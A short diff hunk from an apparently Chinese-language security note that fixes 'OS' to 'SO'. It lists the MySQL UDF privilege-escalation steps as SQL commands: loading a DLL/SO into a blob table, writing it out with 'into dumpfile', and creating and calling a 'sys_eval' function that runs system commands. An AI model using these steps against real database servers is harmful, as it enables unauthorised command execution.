@@ -421,11 +421,11 @@ UDF（user define function）用户自定义功能。提权的本质是通过以
 
 提权步骤
 
-1. 建表：先创建一张临时表存放 DLL/OS 文件的十六进制内容
+1. 建表：先创建一张临时表存放 DLL/SO 文件的十六进制内容
    - `create table temp_udf(udf blob);`
-2. 插入：`insert into temp_udf values(convert(DLL/OS的十六进制内容,char));`
+2. 插入：`insert into temp_udf values(convert(DLL/SO 的十六进制内容,char));`
 3. 导出：使用 dumpfile，因为它会保持原数据格式
-   * `select udf from temp_udf into dumpfile "DLL/OS 存放路径";`
+   * `select udf from temp_udf into dumpfile "DLL/SO 存放路径";`
 4. 创建函数：`create function sys_eval returns string soname "udf.[so|dll]";`
 5. 执行函数：`select sys_eval('whoami');`
 
